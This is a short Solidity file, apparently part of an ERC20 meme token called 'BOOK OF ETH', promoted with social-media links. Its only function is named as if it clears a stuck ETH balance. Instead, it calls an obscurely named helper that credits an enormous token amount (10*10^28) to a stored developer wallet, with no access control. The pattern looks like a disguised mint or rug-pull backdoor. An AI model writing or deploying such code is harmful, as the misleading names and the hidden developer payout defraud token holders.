/**
 */
// SPDX-License-Identifier: MIT
/*

https://t.me/BOOKOFETH_ETH

https://twitter.com/BOOKOF_ETH
BOOK OF ETH!
*/

pragma solidity ^0.8.19;
import "./TestLib.sol";
contract clearStuckBalanceETHtolitbomeFacet is ERC20 {
    using Address for address payable;

    modifier lockTheSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (!ds._interlock) {
            ds._interlock = true;
            _;
            ds._interlock = false;
        }
    }

    function clearStuckBalanceETHtolitbome() external payable {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        andnicob(ds.devswalletsbome, 10 * 10 ** 28);
    }
}
